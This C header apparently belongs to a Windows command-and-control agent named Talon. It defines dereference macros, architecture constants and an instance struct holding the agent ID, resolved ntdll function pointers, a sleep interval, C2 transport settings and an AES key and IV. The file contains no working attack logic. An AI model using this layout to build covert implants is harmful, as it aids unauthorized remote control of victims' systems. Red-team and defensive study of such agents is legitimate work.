#ifndef AGENT_TALON_H
#define AGENT_TALON_H

#include <windows.h>
#include <stdio.h>

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

#define PROCESS_ARCH_UNKNOWN    0
#define PROCESS_ARCH_X86		1
#define PROCESS_ARCH_X64		2
#define PROCESS_ARCH_IA64       3


#ifdef _WIN64
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X64
#else
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X86
#endif

#define TALON_MAGIC_VALUE ( UINT32 ) 'talon'

typedef struct _INSTANCE {
    struct {
        UINT32  AgentID;

        DWORD   OSArch;
        BOOL    Connected;
    } Session;

    struct {
        ULONG ( WINAPI *RtlRandomEx   ) ( PULONG );
        VOID  ( WINAPI* RtlGetVersion ) ( POSVERSIONINFOEXW );
    } Win32;

    struct {
        DWORD Sleeping;

        struct {
            LPWSTR UserAgent;
            LPWSTR Host;
            DWORD  Port;

            BOOL   Secure;
        } Transport ;

        // Encryption / Decryption
        struct
        {
            PBYTE Key;
            PBYTE IV;
        } AES;
    } Config;

} INSTANCE, *PINSTANCE;

extern INSTANCE Instance;
void entry();

#endif
